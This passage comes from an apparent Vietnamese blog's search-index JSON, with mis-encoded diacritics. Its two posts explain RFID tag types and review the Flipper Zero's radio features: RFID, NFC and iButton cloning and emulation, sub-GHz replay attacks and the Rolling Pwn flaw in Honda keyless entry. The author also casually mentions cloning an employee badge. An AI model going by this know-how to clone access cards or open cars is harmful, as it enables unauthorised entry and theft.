th·∫ª cho v·∫≠t nu√¥i, \u0026hellip; v√† th·∫ª d√°n trong xe hay g∆∞∆°ng c·ªßa ETC ƒë√≥. C√≥ 2 lo·∫°i RFID l√† High-frequency tags (th·∫ª t·∫ßn s·ªë cao) v√† Low-frequency tags (th·∫ª t·∫ßn s·ªë th·∫•p).\n Low-frequency tags (125kHz): ho·∫°t ƒë·ªông ·ªü 125kHz. M·∫∑c d√π ch√∫ng kh√¥ng an to√†n, tuy nhi√™n v·∫´n ƒë∆∞·ª£c s·ª≠ d·ª•ng r·ªông r√£i ·ªü c√°c h·ªá th·ªëng ki·ªÉm so√°t truy c·∫≠p v√≠ d·ª• nh∆∞ th·∫ª nh√¢n vi√™n, th·∫ª g·ª≠i xe, \u0026hellip; High-frequency tags (13.56MHz): c√≥ ph·∫°m vi hi·ªáu qu·∫£ th·∫•p h∆°n khi so s√°nh v·ªõi low-frequency tags, tuy nhi√™n giao th·ª©c th√¨ ph·ª©c t·∫°p h∆°n, an to√†n h∆°n v√¨ c√≥ h·ªó tr·ª£ m√£ ho√°, x√°c th·ª±c. Nh·ªØng th·∫ª n√†y hay ƒë∆∞·ª£c d√πng trong th·∫ª ng√¢n h√†ng, cƒÉn c∆∞·ªõc c√¥ng d√¢n \u0026hellip; (c√≤n ƒë∆∞·ª£c g·ªçi c√°i t√™n kh√°c l√† NFC) Ultra-High Frequency RFID: th·∫≠t ra l√† c√≥ 1 lo·∫°i n·ªØa c·ªßa RFID l√† t·∫ßn s·ªë c·ª±c cao, l√† lo·∫°i c√≥ t·ªëc ƒë·ªô ƒë·ªçc nhanh nh·∫•t v√† ph·∫°m vi ƒë·ªçc r·ªông nh·∫•t. C√≥ 2 lo·∫°i th·∫ª UHF, 1 lo·∫°i t·∫ßm g·∫ßn v√† 1 lo·∫°i t·∫ßm xa s·ª≠ d·ª•ng trong ph·∫°m vi 840-960 MHz. Lo·∫°i t·∫ßm xa c√≥ th·ªÉ ƒë·ªçc ·ªü ph·∫°m vi xa t·ªõi 12 m√©t ƒë·ªëi v·ªõi th·∫ª RFID th·ª• ƒë·ªông (kh√¥ng c·∫ßn d√πng nƒÉng l∆∞·ª£ng) v√† v·ªõi 100 m√©t ƒë·ªëi v·ªõi lo·∫°i RFID ch·ªß ƒë·ªông (c√≥ s·ª≠ d·ª•ng nƒÉng l∆∞·ª£ng). Tuy nhi√™n v√¨ xa nh∆∞ v·∫≠y n√™n hay b·ªã nhi·ªÖu nh·∫•t :-s. Lo·∫°i n√†y th√¨ ƒë∆∞·ª£c ETC s·ª≠ d·ª•ng ƒë·ªÉ d√°n l√™n xe ƒë·ªÉ thu ph√≠ kh√¥ng d·ª´ng.  C√°ch ho·∫°t ƒë·ªông c·ªßa th·∫ª RFID H·∫ßu h·∫øt c√°c th·∫ª RFID l√† lo·∫°i th·∫ª th·ª• ƒë·ªông (kh√¥ng s·ª≠ d·ª•ng nƒÉng l∆∞·ª£ng, kh√¥ng c·∫ßn ngu·ªìn ƒëi·ªán b√™n trong). Con chip b√™n trong th·∫ª ƒë∆∞·ª£c t·∫Øt cho ƒë·∫øn khi th·∫ª ti·∫øp x√∫c v·ªõi tr∆∞·ªùng ƒëi·ªán t·ª´ c·ªßa ƒë·∫ßu ƒë·ªçc. ƒê·∫ßu ƒë·ªçc s·∫Ω ph√°t tr∆∞·ªùng ƒëi·ªán t·ª´, truy·ªÅn cho th·∫ª RFID t√Ω ƒëi·ªán, cu·ªôn c·∫£m c·ªßa th·∫ª RFID s·∫Ω h·∫•p th·ª• nƒÉng l∆∞·ª£ng t·ª´ tr∆∞·ªùng c·ªßa ƒë·∫ßu ƒë·ªçc v√† chip c√≥ ƒë·ªß ƒëi·ªán ƒë·ªÉ b·∫≠t l√™n, v√† giao ti·∫øp v·ªõi ƒë·∫ßu ƒë·ªçc. ƒêi·ªÅu ƒë√°ng n√≥i l√† ƒÉng-ten c·ªßa th·∫ª ƒë∆∞·ª£c ƒëi·ªÅu ch·ªânh theo m·ªôt t·∫ßn s·ªë c·ª• th·ªÉ, v√¨ v·∫≠y th·∫ª ch·ªâ c√≥ th·ªÉ k√≠ch ho·∫°t khi n√≥ ·ªü b√™n trong tr∆∞·ªùng ƒëi·ªán t·ª´ ph√π h·ª£p. ƒêi·ªÅu n√†y c√≥ th·ªÉ l√Ω gi·∫£i t·∫°i sao th·∫ª RFID th·ª• ƒë·ªông c·∫ßn 1 kho·∫£ng th·ªùi gian delay khi m√¨nh qu·∫πt th√¨ ƒë·∫ßu ƒë·ªçc m·ªõi nh·∫≠n ƒë∆∞·ª£c t√≠n hi·ªáu t·ª´ th·∫ª.\nC√°c lo·∫°i th·∫ª RFID C√≥ kh√° nhi·ªÅu lo·∫°i th·∫ª RFID, ƒë·ªß th·ªÉ lo·∫°i h√¨nh d·∫°ng, c√≥ c·∫£ th·∫ª d√†y, th·∫ª m·ªèng, ki·ªÉu key fobs, v√≤ng ƒëeo tay hay d·∫°ng ti·ªÅn xu. Ch·ªâ nh√¨n b·∫±ng \u0026ldquo;giao di·ªán\u0026rdquo; h·∫ßu nh∆∞ kh√¥ng th·ªÉ ph√¢n bi·ªát ƒë∆∞·ª£c t·∫ßn su·∫•t ho·∫∑c giao th·ª©c m√† th·∫ª ho·∫°t ƒë·ªông.\nNh·∫≠n di·ªán th·∫ª 125 kHz, 13.56 MHz v√† UHF - C√°i n√†o l√† c√°i n√†o? Nh·∫≠n di·ªán d·ªÖ nh·∫•t th√¨ ch·∫Øc l√† th·∫ª UHF RFID, n√≥ d√†i ngo·∫±ng v√† c√≥ 1 con chip ·ªü trung t√¢m, cu·ªôn c·∫£m th√¨ thi·∫øt k·∫ø kh√° b√©, v√† d·∫°ng ƒÉng ten. C·∫ßn c√≥ ƒë·∫ßu ƒë·ªçc (UHF Reader) chi·∫øu ƒë√∫ng h∆∞·ªõng v√†o th·∫ª (UHF tag) th√¨ m·ªõi c√≥ th·ªÉ ƒë·ªçc ƒë∆∞·ª£c. ·ª®ng d·ª•ng c√°i n√†y v√†o trong b√£i g·ª≠i xe t·ª± ƒë·ªông, hay thu ph√≠ kh√¥ng d·ª´ng ETC.\nC√≤n ƒë·ªëi v·ªõi RFID 125kHz v√† 13.56MHz th√¨ nh√¨n ·ªü cu·ªôn c·∫£m. B·∫°n chi·∫øu ƒë√®n pin v√†o th·∫ª th√¨ c√≥ th·ªÉ nh√¨n th·∫•y cu·ªôn c·∫£m n√†y. N·∫øu cu·ªôn c·∫£m ch·ªâ c√≥ m·ªôt v√†i v√≤ng tr√≤n l·ªõn, r·∫•t c√≥ th·ªÉ ƒë√≥ l√† RFID t·∫ßn s·ªë cao. N·∫øu cu·ªôn c·∫£m tr√¥ng gi·ªëng nh∆∞ m·ªôt m·∫£nh kim lo·∫°i ƒë·∫∑c kh√¥ng c√≥ kho·∫£ng tr·ªëng gi·ªØa c√°c v√≤ng, th√¨ ƒë√≥ l√† cu·ªôn c·∫£m t·∫ßn s·ªë th·∫•p.\nLow-frequency tags (125kHz)  T·∫ßm xa : t·∫ßn s·ªë th·∫•p h∆°n chuy·ªÉn th√†nh ph·∫°m vi cao h∆°n. C√≥ m·ªôt s·ªë ƒë·∫ßu ƒë·ªçc EM-Marin v√† HID, ho·∫°t ƒë·ªông t·ª´ kho·∫£ng c√°ch l√™n ƒë·∫øn m·ªôt m√©t. Ch√∫ng th∆∞·ªùng ƒë∆∞·ª£c s·ª≠ d·ª•ng trong b√£i ƒë·∫≠u xe h∆°i. Protocol s∆° khai: do t·ªëc ƒë·ªô truy·ªÅn d·ªØ li·ªáu th·∫•p, c√°c th·∫ª n√†y ch·ªâ c√≥ th·ªÉ truy·ªÅn d·ªØ li·ªáu v√†i byte. Trong h·∫ßu h·∫øt c√°c tr∆∞·ªùng h·ª£p, d·ªØ li·ªáu kh√¥ng ƒë∆∞·ª£c x√°c th·ª±c v√† n√≥ kh√¥ng ƒë∆∞·ª£c b·∫£o v·ªá theo b·∫•t k·ª≥ c√°ch n√†o. Ngay sau khi th·∫ª n·∫±m trong ph·∫°m vi c·ªßa ƒë·∫ßu ƒë·ªçc, th·∫ª ch·ªâ b·∫Øt ƒë·∫ßu truy·ªÅn ID c·ªßa n√≥ cho ƒë·∫ßu ƒë·ªçc. B·∫£o m·∫≠t th·∫•p: Nh·ªØng th·∫ª n√†y c√≥ th·ªÉ d·ªÖ d√†ng sao ch√©p ho·∫∑c th·∫≠m ch√≠ ƒë·ªçc t·ª´ t√∫i c·ªßa ng∆∞·ªùi kh√°c do t√≠nh s∆° khai c·ªßa protocol.  High-frequency tags (13.56MHz)  T·∫ßm g·∫ßn: Th·∫ª t·∫ßn s·ªë cao ƒë∆∞·ª£c thi·∫øt k·∫ø ƒë·∫∑c bi·ªát ƒë·ªÉ ch√∫ng ph·∫£i ƒë·∫∑t ·ªü t·∫ßm g·∫ßn c·ªßa ƒë·∫ßu ƒë·ªçc th√¨ m·ªõi c√≥ th·ªÉ nh·∫≠n di·ªán ƒë∆∞·ª£c. ƒêi·ªÅu n√†y c≈©ng gi√∫p b·∫£o v·ªá th·∫ª kh·ªèi c√°c t∆∞∆°ng t√°c v·ªõi th·∫ª tr√°i ph√©p khi ch·ªß nh√¢n kh√¥ng cho ph√©p. Ph·∫°m vi t·ªëi ƒëa c√≥ th·ªÉ t∆∞∆°ng t√°c ƒë∆∞·ª£c l√† v√†o kho·∫£ng 15cm ƒë·ªëi v·ªõi nh·ªØng th·∫ª ƒë∆∞·ª£c custom l·∫°i. Protocol n√¢ng cao: Data ƒë∆∞·ª£c truy·ªÅn v·ªõi t·ªëc ƒë·ªô 424 kbps, cho ph√©p g·ª≠i d·ªØ li·ªáu 2 chi·ªÅu. T·ª´ ƒë√≥ c√≥ th·ªÉ x√°c th·ª±c m·∫≠t m√£, m√£ ho√° hay truy·ªÅn d·ªØ li·ªáu l·ªõn. B·∫£o m·∫≠t cao: Kh√¥ng thua k√©m g√¨ th·∫ª th√¥ng minh. C√≥ nh·ªØng th·∫ª h·ªó tr·ª£ c√°c thu·∫≠t to√°n m·∫°nh v·ªÅ m·∫∑t m·∫≠t m√£ nh∆∞ AES v√† kho√° b·∫•t ƒë·ªëi x·ª©ng.   Do ƒë·∫∑c t√≠nh c·ªßa low-frequency tags n√™n ho√†n to√†n c√≥ th·ªÉ clone th·∫ª d·ªÖ d√†ng (v√¨ n√≥ 1 chi·ªÅu)\n S·ª≠ d·ª•ng Flipper Zero ƒë·ªÉ c√≥ th·ªÉ gi·∫£ l·∫≠p th·∫ª RFID Ai ch∆∞a bi·∫øt ƒë·∫øn Flipper Zero l√† g√¨ c√≥ th·ªÉ ƒë·ªçc b√†i gi·ªõi thi·ªáu t·∫°i ƒë√¢y.\n{@embed: https://vimeo.com/752423116}\nFlipper Zero c√≥ th·ªÉ ƒë·ªçc ƒë∆∞·ª£c r·∫•t nhi·ªÅu lo·∫°i th·∫ª RFID\n EM-Marin: EM4100, EM4102, giao th·ª©c ph·ªï bi·∫øn nh·∫•t trong CIS. C√≥ th·ªÉ ƒë∆∞·ª£c ƒë·ªçc t·ª´ kho·∫£ng m·ªôt m√©t v√¨ s·ª± ƒë∆°n gi·∫£n v√† ·ªïn ƒë·ªãnh c·ªßa n√≥. HID Prox II: giao th·ª©c t·∫ßn s·ªë th·∫•p ƒë∆∞·ª£c gi·ªõi thi·ªáu b·ªüi HID Global. Giao th·ª©c n√†y ph·ªï bi·∫øn h∆°n ·ªü c√°c n∆∞·ªõc ph∆∞∆°ng T√¢y. N√≥ ph·ª©c t·∫°p h∆°n v√† th·∫ª v√† ƒë·∫ßu ƒë·ªçc cho giao th·ª©c n√†y t∆∞∆°ng ƒë·ªëi ƒë·∫Øt. Indala: giao th·ª©c t·∫ßn s·ªë th·∫•p r·∫•t c≈© ƒë∆∞·ª£c Motorola gi·ªõi thi·ªáu v√† sau ƒë√≥ ƒë∆∞·ª£c HID mua l·∫°i. B·∫°n √≠t c√≥ kh·∫£ nƒÉng g·∫∑p ph·∫£i n√≥ trong t·ª± nhi√™n so v·ªõi hai ph·∫ßn tr∆∞·ªõc v√¨ n√≥ ƒëang kh√¥ng c√≤n ƒë∆∞·ª£c s·ª≠ d·ª•ng. V√¢n v√¢n v√† m√¢y m√¢y kh√°c \u0026hellip;  C√≥ 2 ki·ªÉu th·∫ª RFID 125kHz m√¨nh g·∫∑p: 1 lo·∫°i ƒë·ªçc v√† ghi ƒë∆∞·ª£c, v√† 1 lo·∫°i th√¨ ch·ªâ ƒë·ªçc, kh√¥ng ghi n·ªïi v√¨ chip kh√¥ng h·ªó tr·ª£. Gi·ªëng vi·ªác ghi d·ªØ li·ªáu v√†o ƒëƒ©a tr·∫Øng ng√†y x∆∞a, kh√¥ng thay ƒë·ªïi ƒë∆∞·ª£c.\nK·∫øt ƒê·∫øn ƒë√¢y c√≥ l·∫Ω c√°c b·∫°n ƒë√£ hi·ªÉu c√°i c√¥ng ngh·ªá \u0026ldquo;ti√™n ti·∫øn\u0026rdquo; m√† c√°c b√°c ƒëang s·ª≠ d·ª•ng ƒë·ªÉ thu ph√≠ kh√¥ng d·ª´ng, hay s·ª≠ d·ª•ng ƒë·ªÉ qu·∫πt th·∫ª ra v√†o r·ªìi. ƒê·ªÉ ph·∫ßn 2 m√¨nh vi·∫øt ti·∫øp v·ªÅ NFC nh√©, c≈©ng h∆°i d√†i r·ªìi. See ya!\nC·∫£m ∆°n anh @ngoctnq ƒë√£ t√†i tr·ª£ device ƒë·ªÉ ae test :rofl:\n","permalink":"https://minhtuanact.ml/posts/cung-tim-hieu-ve-rfid-cong-nghe-tien-tien-viet-nam-dang-su-dung-voi-etc-thu-phi-khong-dung/","summary":"B·ªØa l√¢u l√¢u r·ªìi m√¨nh c√≥ ƒë·ªçc ƒë∆∞·ª£c th√¥ng tin n√†y t·ª´ 1 page c√≥ t√≠ch xanh Th√¥ng tin real n√≥ ·ªü ƒë√¢y, c√°c b·∫°n c√≥ th·ªÉ v√†o ƒë·ªçc :D https://www.facebook.com/thongtinchinhphu/posts/pfbid0Uuqh9DKGVVES7T5ApQDepxa6WNw3YMuDtsMxFKERc5QttHWgBNvVJvVNVRZUNkxpl\n·ªú th√¨ m√¨nh c≈©ng c√≥ t√≠nh t√≤ m√≤, sao c√°i c√¥ng ngh·ªá RFID Vi·ªát Nam ƒëang √°p d·ª•ng cho thu ph√≠ kh√¥ng d·ª´ng (ETC) n√≥ l·∫°i ti√™n ti·∫øn th·∫ø, h∆°n c·∫£ Sing (th·∫≠t ra l√† m√¨nh bi·∫øt n√≥ c≈©ng c√°ch ƒë√¢y m·∫•y nƒÉm, h·ªìi c√≤n clone th·∫ª nh√¢n vi√™n ƒë·ªÉ d√πng, v√¨ ti·ªÅn ƒë·ªÅn th·∫ª nh√¢n vi√™n khi m·∫•t m·∫∑n qu√°, t·∫≠n 200k l·∫≠n :\u0026lt;)","title":"C√πng t√¨m hi·ªÉu v·ªÅ RFID, c√¥ng ngh·ªá \"ti√™n ti·∫øn\" Vi·ªát Nam ƒëang s·ª≠ d·ª•ng v·ªõi ETC (thu ph√≠ kh√¥ng d·ª´ng)"},{"content":"D·∫°o g·∫ßn ƒë√¢y m√¨nh l√™n Twitter th·∫•y m·ªçi ng∆∞·ªùi share 1 tool (g·∫ßn nh∆∞ l√† 1 ƒë·ªì ch∆°i) th√∫ v·ªã qu√°, n√™n m√¨nh share l√™n ƒë√¢y cho m·ªçi ng∆∞·ªùi bi·∫øt v√† ti·∫øp c·∫≠n ƒë·∫øn n√≥ :D\n B√†i vi·∫øt n√†y kh√¥ng ph·∫£i qu·∫£ng c√°o, m√¨nh c≈©ng ch∆∞a ƒë∆∞·ª£c c·∫ßm tr√™n tay thi·∫øt b·ªã n√†y n·ªØa :joy:\n FlipperZero Theo nh∆∞ m√¥ t·∫£ t·ª´ trang ch·ªß th√¨\n Flipper Zero is a portable multi-tool for pentesters and geeks in a toy-like body. It loves researching digital stuff like radio protocols, access control systems, hardware, and more. It\u0026rsquo;s fully open-source and customizable, so you can extend it in whatever way you like\n  M·ªôt set ƒë·ªì c·ªßa Flipper Zero, kh√° nhi·ªÅu ƒë·ªì ch∆°i ƒëi k√®m\n C·∫•u t·∫°o c·ªßa FlipperZero kh√° ƒë∆°n gi·∫£n, ch·ªâ bao g·ªìm 1 m√†n h√¨nh LCD, 5 button ƒëi·ªÅu ki·ªÉn v√† 1 n√∫t back/exit, k·∫øt h·ª£p c√πng v·ªõi c·ªïng type-c v·ª´a s·∫°c v·ª´a truy·ªÅn data, khe c·∫Øm MicroSD c√πng v·ªõi ch√¢n c·∫Øm GPIO v√† m·ªôt c·ªïng h·ªìng ngo·∫°i. C√πng ƒëi·ªÉm qua m·ªôt v√†i t√≠nh nƒÉng m√† device n√†y l√†m ƒë∆∞·ª£c nh√©.\nSub-1 GHz Transceiver Flipper ƒë∆∞·ª£c t√≠ch h·ª£p ƒÉng-ten 433MHz v√† chip TI CC1101, gi√∫p n√≥ tr·ªü th√†nh m·ªôt b·ªô thu ph√°t m·∫°nh m·∫Ω c√≥ kh·∫£ nƒÉng thu ph√°t s√≥ng, ph√¢n t√≠ch trong ph·∫°m vi l√™n ƒë·∫øn 50 m√©t.\nƒê√¢y l√† ph·∫°m vi ho·∫°t ƒë·ªông cho nhi·ªÅu lo·∫°i thi·∫øt b·ªã kh√¥ng d√¢y v√† h·ªá th·ªëng ki·ªÉm so√°t truy c·∫≠p, ch·∫≥ng h·∫°n nh∆∞ ƒëi·ªÅu khi·ªÉn t·ª´ xa c·ª≠a cu·ªën, barriers, c·∫£m bi·∫øn IoT v√† h·ªá th·ªëng remote (v√≠ d·ª• nh∆∞ tr√™n xe m√°y, oto s·ª≠ d·ª•ng smart-key).\n V·ªÅ Sub-1 Ghz, c√°c b·∫°n c√≥ th·ªÉ ƒë·ªçc th√™m t·∫°i b√†i vi·∫øt n√†y https://www.daviteq.com/blog/vi/truyen-thong-khong-day-sub-ghz-la-gi/\n C√°c b·∫°n c√≥ th·ªÉ xem video ƒë∆°n gi·∫£n t·∫°i ƒë√¢y ƒë·ªÉ hi·ªÉu ch·ª©c nƒÉng n√†y c·ªßa Flipper\nDemo ƒë∆°n gi·∫£n l√† capture ƒë∆∞·ª£c s√≥ng v√† emulator l·∫°i s√≥ng ƒë√≥ (ƒë∆∞·ª£c g·ªçi l√† replay attack), tuy nhi√™n hi·ªán t·∫°i s·ªë xe m√°y, oto s·ª≠ d·ª•ng ki·ªÉu s√≥ng n√†y c√≤n √≠t ho·∫∑c ch·ªâ t·ªìn t·∫°i v·ªõi h·ªá th·ªëng k√©m b·∫£o m·∫≠t. Thay v√†o ƒë√≥ h·ªá th·ªëng remote kh√¥ng c·∫ßn ch√¨a kho√° (smart-key) ƒë∆∞·ª£c s·ª≠ d·ª•ng hi·ªán nay l√† Rolling Code. Nh∆∞ng gi·ªØa th√°ng 7 v·ª´a r·ªìi c√≥ 1 team researcher ƒë√£ ph√°t hi·ªán ra l·ªói Rolling Pwn c√≥ th·ªÉ crack b·∫•t k√¨ chi·∫øc xe Honda n√†o s·∫£n xu·∫•t t·ª´ 2012 ƒë·∫øn 2022, h·ªç ƒë·ªÉ t√™n l√† Rolling Pwn ch·ª© kh√¥ng ph·∫£i Honda Pwn v√¨ h·ªá th·ªëng Rolling code n√†y ho√†n to√†n c√≥ th·ªÉ s·ª≠ d·ª•ng tr√™n nh·ªØng chi·∫øc xe kh√°c https://rollingpwn.github.io/rolling-pwn/\nV·∫≠y ch√∫ng ta ch·ªâ c·∫ßn v·ªõi 1 PoC RollingPwn v√† n·∫°p code v√†o Flipper th√¨ ho√†n to√†n c√≥ th·ªÉ \u0026ldquo;hack\u0026rdquo; b·∫•t c·ª© chi·∫øc xe Honda (t·∫°m l√† th·∫ø) n√†o r·ªìi :joy:\nƒê·∫∑c bi·ªát l√† Honda s·∫Ω kh√¥ng Fix l·ªói n√†y, PoC m√† ra ƒë·ªùi th√¨ t·∫∑c th·ªß SH, oto th√¨ c√≥ m√† :cold_sweat: ae nh·ªõ trang b·ªã kho√° ch·ªØ U cho ch·∫Øc c·ªëp nh√©.\nhttps://twitter.com/Jamorobo/status/1544759228388511744\nTesla c≈©ng c√≥ th·ªÉ m·ªü ƒë∆∞·ª£c nh√© :joy:\n125kHz RFID C√°c b·∫°n ƒë√£ bao gi·ªù c·∫ßn ph·∫£i s·ª≠ d·ª•ng qu√° nhi·ªÅu th·∫ª ra v√†o hay ch∆∞a, th·∫ª qu·∫πt thang m√°y chung c∆∞, th·∫ª qu·∫πt v√†o c√¥ng ty, th·∫ª qu·∫πt g·ª≠i xe to√† nh√†, th·∫ª th·∫ª \u0026hellip; N√≥i chung l√† ch√∫ng ta c·∫ßn ph·∫£i c·∫ßm qu√° nhi·ªÅu th·∫ª ƒë·ªÉ ƒëi ƒë√¢u ƒë√≥, qu√™n m·ªôt c√°i l√† v√°ng c·∫£ ƒë·∫ßu :confused:. Nhi·ªÅu ng∆∞·ªùi ƒë√£ ch·ªçn c√°ch mua th·∫ª tr·∫Øng v·ªÅ ƒë·ªÉ clone ra nhi·ªÅu c√°i d√πng backup. Tuy nhi√™n v·ªõi Flipper n√≥ c√≥ th·ªÉ ƒë·ªçc, ghi v√† emulator l·∫°i ƒë√∫ng m√£ code ƒë√≥ ƒë·ªÉ ch√∫ng ta c√≥ th·ªÉ qu·∫πt tho·∫£i m√°i r·ªìi. V·∫≠y ƒë·ªëng th·∫ª m√¨nh k·ªÉ b√™n tr√™n c√≥ th·ªÉ t√≠ch h·ª£p v√†o Flipper, ch√∫ng ta ch·ªâ c·∫ßn c·∫ßm m·ªói Flipper ƒëi ra ngo√†i th√¥i, kh√° ti·ªán ƒë√∫ng kh√¥ng :)\nNFC T∆∞∆°ng t·ª± v·ªõi 125kHz RFID, NFC (High-Frequency 13.56MHz) c≈©ng ƒë∆∞·ª£c Flipper ƒë·ªçc, ghi v√† emulator l·∫°i ƒë∆∞·ª£c, NFC c√≥ th·ªÉ l√† quen thu·ªôc v·ªõi m·ªçi ng∆∞·ªùi khi s·ª≠ d·ª•ng ƒëi·ªán tho·∫°i di ƒë·ªông c√≥ t√≠ch h·ª£p NFC r·ªìi (m·∫∑c d√π r·∫•t √≠t khi s·ª≠ d·ª•ng ƒë·∫øn n√≥ nh∆∞ng m√† n√≥ kh√° l√† ti·ªán ƒë·∫•y)\nInfrared Transceiver Nh·ªõ ng√†y x∆∞a tr∆∞·ªùng m√¨nh c√≥ ƒëi·ªÅu ho√† nh∆∞ng m√† kh√¥ng c√≥ ƒëi·ªÅu khi·ªÉn ƒë·ªÉ b·∫≠t, h·ªìi ƒë√≥ m√¨nh d√πng ƒëi·ªán tho·∫°i Xiaomi c√≥ t√≠ch h·ª£p c·ªïng h·ªìng ngo·∫°i gi√∫p b·∫≠t ƒëi·ªÅu ho√†, ƒë·ª° ph·∫£i ch·ªù ai ƒë√≥ c·∫ßm ƒëi·ªÅu khi·ªÉn l√™n b·∫•m cho m·∫•t c√¥ng :joy:\nFlipper c≈©ng t√≠ch h·ª£p c·ªïng h·ªìng ngo·∫°i ƒë·ªÉ ƒëi·ªÅu khi·ªÉn c√°c thi·∫øt b·ªã s·ª≠ d·ª•ng s√≥ng h·ªìng ngo·∫°i nh∆∞ Tivi, ƒëi·ªÅu ho√†, qu·∫°t c√¢y, \u0026hellip; N√≥ c√≥ 1 b·ªô th∆∞ vi·ªán t√≠ch h·ª£p s·∫µn c√°c s√≥ng h·ªìng ngo·∫°i c·ªßa c√°c h√£ng Tivi n·ªïi ti·∫øng hi·ªán nay, Flipper c≈©ng c√≥ th·ªÉ h·ªçc ƒë∆∞·ª£c c√°c s√≥ng n·∫øu c√°c b·∫°n b·∫•m remote v√†o c·ªïng h·ªìng ngo·∫°i c·ªßa Flipper, l∆∞u data tho·∫£i m√°i n·ªØa.\nMicroSD Card ƒê∆∞∆°ng nhi√™n r·ªìi, Flipper h·ªó tr·ª£ MicroSD Card, c√≥ th·ªÉ s·ª≠ d·ª•ng ƒë·ªÉ extends apps, data, update firmware\nTool for Hardware Exploration Flipper c√≥ c·ªïng GPIO, cho ph√©p ƒëi·ªÅu khi·ªÉn thi·∫øt b·ªã ƒëi·ªán t·ª≠ tr·ª±c ti·∫øp th√¥ng qua Flipper. Flipper c≈©ng c√≥ th·ªÉ ƒë∆∞·ª£c s·ª≠ d·ª•ng nh∆∞ m·ªôt c·∫ßu n·ªëi USB sang SPI/UART/I2C ƒë·ªÉ debugging, flashing and fuzzing.\nHID Emulation S·ª≠ d·ª•ng Flipper nh∆∞ m·ªôt USB Ducky, ho√†n to√†n c√≥ th·ªÉ!\nU2F Security Toke Flipper Zero l√† m·ªôt token U2F ƒë·∫ßy ƒë·ªß ch·ª©c nƒÉng, t∆∞∆°ng th√≠ch v·ªõi b·∫•t k·ª≥ d·ªãch v·ª• n√†o h·ªó tr·ª£ U2F: Google, Twitter, LastPass, v.v. M·∫°nh h∆°n nhi·ªÅu so v·ªõi 2FA truy·ªÅn th·ªëng (SMS, Email), U2F ƒë·∫£m b·∫£o r·∫±ng t√†i kho·∫£n c·ªßa b·∫°n ƒë∆∞·ª£c an to√†n v√† b·∫£o m·∫≠t b·ªüi Flipper Zero.\nOpen Source \u0026amp; Extenable Flipper Zero 100% Open Source \u0026amp; Open Hardware, v·ªõi firmware source, s∆° ƒë·ªì, SDK ƒëa n·ªÅn t·∫£ng v√† c√°c Desktop \u0026amp; Mobile tools c√≥ s·∫µn. C√°c b·∫°n c√≥ th·ªÉ t√¨m th·∫•y t·∫°i Github c·ªßa Flipper https://github.com/flipperdevices\nT·∫•t c·∫£ c√°c th√†nh ph·∫ßn hardware v√† firmware c·ªßa Flipper ƒë·ªÅu c√≥ s·∫µn, cho ph√©p t√πy ch·ªânh ho√†n to√†n - t·ª´ c√°c plugin Arduino ƒë·∫øn c√°c m√¥-ƒëun hardware c√≥ th·ªÉ c·∫Øm ƒë∆∞·ª£c.\niButton Flipper Zero ƒë∆∞·ª£c t√≠ch h·ª£p ch√¢n k·∫øt n·ªëi 1-Wire ƒë·ªÉ ƒë·ªçc iButton (hay c√≤n g·ªçi l√† DS1990A, Touch Memory ho·∫∑c ph√≠m Dallas). C√¥ng ngh·ªá c≈© n√†y v·∫´n ƒë∆∞·ª£c s·ª≠ d·ª•ng r·ªông r√£i tr√™n kh·∫Øp th·∫ø gi·ªõi (m·∫∑c d√π m√¨nh c√≤n ch·∫≥ng ƒë∆∞·ª£c s·ª≠ d·ª•ng bao gi·ªù :joy:). N√≥ s·ª≠ d·ª•ng giao th·ª©c 1-Wire kh√¥ng c√≥ b·∫•t k·ª≥ x√°c th·ª±c n√†o. Flipper c√≥ th·ªÉ d·ªÖ d√†ng ƒë·ªçc c√°c kh√≥a n√†y, l∆∞u tr·ªØ ID v√†o b·ªô nh·ªõ, ghi ID v√†o c√°c kh√≥a tr·ªëng v√† m√¥ ph·ªèng ch√≠nh kh√≥a ƒë√≥.\nBluetooth and Wireless Flipper c√≥ s·∫µn Bluetooth, cho ph√©p giao ti·∫øp tr·ª±c ti·∫øp v·ªõi c√°c app mobile v√† h·ªó tr·ª£ Wifi th√¥ng qua m√¥-ƒëun Wifi-Development (wifi th√¨ kh√¥ng s·∫µn c√≥, ph·∫£i c·∫Øm th√™m nh√©).\nNhi·ªÅu Flippers c√≥ th·ªÉ giao ti·∫øp v·ªõi nhau v·ªõi s√≥ng 433MHz, cho ph√©p b·∫°n t√¨m v√† tr√≤ chuy·ªán v·ªõi nh·ªØng ng∆∞·ªùi b·∫°n ƒë∆∞·ª£c trang b·ªã Flipper \u0026hellip;\nNote V·ªõi r·∫•t nhi·ªÅu tool ƒë∆∞·ª£c t√≠ch h·ª£p v√†o m·ªôt device kh√° nh·ªè b√©, m√¨nh th·∫•y Flipper kh√° ti·ªán d·ª•ng v√† ƒëa nƒÉng. Ph√π h·ª£p v·ªõi nh·ªØng ng∆∞·ªùi hay m√†y m√≤ v√† y√™u th√≠ch c√¥ng ngh·ªá. Tuy nhi√™n ch∆∞a ƒë·∫∑t ship ƒë∆∞·ª£c v·ªÅ VN n√™n m√¨nh k bi·∫øt mua ki·ªÉu g√¨, n·∫øu mua ƒë∆∞·ª£c kh√©o m√¨nh c≈©ng l√†m 1 chi·∫øc ƒë·ªÉ ngh·ªãch th·ª≠ xem sao, kh√° l√† th√∫ v·ªã!\nB·∫°n ƒë·ªçc c√≥ th·ªÉ l√™n Twitter xem nh·ªØng chia s·∫ª c·ªßa c√°c b·∫°n n∆∞·ªõc ngo√†i khi tr√™n tay Flipper Zero nh√© ;)\nhttps://twitter.com/search?q=%23flipperzero\u0026amp;src=recent_search_click\nTham kh·∫£o  https://flipperzero.one/ https://lab401.com/products/flipper-zero https://twitter.com/search?q=%23flipperzero\u0026amp;src=recent_search_click  ","permalink":"https://minhtuanact.ml/posts/flipperzero-tro-thu-dac-luc-cho-pentesters-va-geeks/","summary":"D·∫°o g·∫ßn ƒë√¢y m√¨nh l√™n Twitter th·∫•y m·ªçi ng∆∞·ªùi share 1 tool (g·∫ßn nh∆∞ l√† 1 ƒë·ªì ch∆°i) th√∫ v·ªã qu√°, n√™n m√¨nh share l√™n ƒë√¢y cho m·ªçi ng∆∞·ªùi bi·∫øt v√† ti·∫øp c·∫≠n ƒë·∫øn n√≥ :D\n B√†i vi·∫øt n√†y kh√¥ng ph·∫£i qu·∫£ng c√°o, m√¨nh c≈©ng ch∆∞a ƒë∆∞·ª£c c·∫ßm tr√™n tay thi·∫øt b·ªã n√†y n·ªØa :joy:\n FlipperZero Theo nh∆∞ m√¥ t·∫£ t·ª´ trang ch·ªß th√¨\n Flipper Zero is a portable multi-tool for pentesters and geeks in a toy-like body.","title":"FlipperZero - 